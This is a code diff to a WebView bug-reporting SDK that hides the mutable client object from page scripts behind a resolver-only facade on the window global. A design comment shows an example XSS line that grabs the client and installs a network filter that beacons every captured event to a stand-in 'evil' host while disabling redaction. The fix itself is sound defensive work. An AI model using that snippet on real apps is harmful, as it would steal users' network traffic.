@@ -63,6 +63,27 @@ import { createWebViewReportPipeline } from './webview-report-pipeline';
 /** The SDK version reported in the handshake (default) + published on the injectable `BugseeWebView` global. */
 export const SDK_VERSION = '0.0.0';
 
+/**
+ * The launched client, held HERE rather than on the process-global carrier.
+ *
+ * In a WebView the page is not the app — native is. The carrier lives at `window.__BUGSEE__`, an ordinary
+ * writable property, so anything stored there is reachable by any page script, third-party tag or XSS:
+ *
+ *   const c = Object.values(window.__BUGSEE__)[0].client;
+ *   c.setNetworkEventFilter(e => { navigator.sendBeacon('//evil', JSON.stringify(e)); return e; });
+ *
+ * A network filter is invoked with every event, body included, and REPLACES the default sanitizer — so
+ * that one line is a capture tap that also switches off default redaction. `setLogEventFilter(() => null)`
+ * suppresses, and `stop()` kills. None of it needs a sink to shadow, a race to win, or the D-A10 secret:
+ * it walks around every defence the bridge has.
+ *
+ * That exposure is correct for @bugsee/browser, where the page IS the app and the client is its own API.
+ * It is wrong here. So the carrier gets a resolver-only facade (below) and the mutation-capable client
+ * stays in this module's scope, reachable only through the value `launch()` returns — which native's
+ * bootstrap holds in a closure the page never sees.
+ */
+let launchedClient: Bugsee | undefined;
+
 // The capture FileTypes this SDK emits — declared in the hello. Native records them nowhere and they decide
 // nothing (D-A7): a claim arriving from the page must never reduce masking. The `obscuring`
 // capability is added DYNAMICALLY (only when the obscuring channel is active — a DOM is present + not opted out)
@@ -276,14 +297,18 @@ export function launch(appToken: string, options: BugseeWebViewLaunchOptions = {
 
   const bridgeSlot = bridgeSlotFor(global, options.onError);
 
-  const alreadyLaunched = getCarrierClient<Bugsee>(carrier);
-  if (alreadyLaunched !== undefined) {
+  // The carrier holds the FACADE, so its presence is the "already launched" signal; the real client to
+  // hand back comes from module scope. A second module copy would see the facade and refuse correctly,
+  // which is the outcome that matters — it just cannot return the first copy's client object.
+  const alreadyLaunched =
+    getCarrierClient<unknown>(carrier) !== undefined ? launchedClient : undefined;
+  if (getCarrierClient<unknown>(carrier) !== undefined) {
     options.onError?.(
       new Error(
         'Bugsee.launch() called more than once in this WebView; the repeat call is ignored',
       ),
     );
-    return alreadyLaunched;
+    return alreadyLaunched as Bugsee;
   }
 
   const resolved = resolveLaunchOptions(
@@ -473,7 +498,8 @@ export function launch(appToken: string, options: BugseeWebViewLaunchOptions = {
     } else {
       publicClient = client;
     }
-    setCarrierClient(publicClient, carrier);
+    launchedClient = publicClient;
+    setCarrierClient(carrierFacadeFor(publicClient), carrier);
     return publicClient;
   }
 
@@ -598,6 +624,7 @@ export function launch(appToken: string, options: BugseeWebViewLaunchOptions = {
       obscuring?.stop(); // detach the secure-area observers/listeners
       bridge.post(encode(byeMessage())); // signal teardown so native can finalize this WebView's stream
       setCarrierClient(undefined, carrier);
+      launchedClient = undefined;
       // The binding cannot be removed (D-A3) — the session behind it goes inert instead, so a page script
       // cannot drive a stopped SDK and a later launch() can re-point the same binding at a live session.
       // Only revert if this session is still the CURRENT one (review round 1). The slot is shared per
@@ -609,6 +636,30 @@ export function launch(appToken: string, options: BugseeWebViewLaunchOptions = {
       return stopCore(timeout);
     },
   };
-  setCarrierClient(publicClient, carrier);
+  launchedClient = publicClient;
+  setCarrierClient(carrierFacadeFor(publicClient), carrier);
   return publicClient;
+}
+
+/**
+ * What the process global is allowed to hold: the service resolver, and nothing else.
+ *
+ * The capture pipeline reaches redaction filters through `getFilters()` → `getInternal()` →
+ * `getService(FiltersToken)`, so `getService`/`getServiceProvider` is the entire internal requirement.
+ * Everything else on the client — `setNetworkEventFilter`, `setLogEventFilter`, `stop`, `logException` —
+ * exists for the embedder and has no business being reachable from page script.
+ *
+ * Reading a service is not a meaningful capability for an attacker who already runs in the page: the
+ * FilterStore it yields holds the filters the EMBEDDER set, and a page script that wanted to read its own
+ * page's traffic can do so directly. What it cannot do any more is REPLACE them.
+ */
+function carrierFacadeFor(client: Bugsee): { getService: unknown; getServiceProvider: unknown } {
+  const resolver = client as unknown as {
+    getService: (token: unknown) => unknown;
+    getServiceProvider: (token: unknown) => unknown;
+  };
+  return {
+    getService: (token: unknown): unknown => resolver.getService(token),
+    getServiceProvider: (token: unknown): unknown => resolver.getServiceProvider(token),
+  };
 }
